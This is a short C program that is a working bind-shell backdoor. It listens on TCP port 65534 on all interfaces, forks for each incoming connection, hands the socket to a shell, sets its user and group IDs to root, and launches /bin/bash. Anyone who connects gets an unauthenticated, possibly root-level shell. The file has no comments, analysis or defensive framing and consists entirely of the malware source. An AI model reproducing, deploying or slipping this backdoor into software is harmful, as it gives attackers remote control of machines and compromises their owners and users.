#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

void
rootme()
{
        char *envargv[] = {"/bin/bash", NULL};
        char *envp[] = {NULL};

        setuid(0);
        setgid(0);
        execve("/bin/bash", envargv, envp);
}

int
main(void)
{
    int sock_file_des, clientfd, pid;
    struct sockaddr_in sock_ad, client;
    char *argv[] = {"/bin/bash", NULL};

    sock_file_des = socket(AF_INET, SOCK_STREAM, 0);
    sock_ad.sin_family = AF_INET;
    sock_ad.sin_port = htons(65534);
    sock_ad.sin_addr.s_addr = INADDR_ANY;
    bind(sock_file_des, (struct sockaddr *) &sock_ad, sizeof(sock_ad));
    listen(sock_file_des, 0);

    while (1) {
        clientfd = accept(sock_file_des, NULL, NULL);
        if ((pid = fork()) == 0) {
            dup2(clientfd, 0);
            dup2(clientfd, 1);
            dup2(clientfd, 2);
            rootme();
        }
    }
}
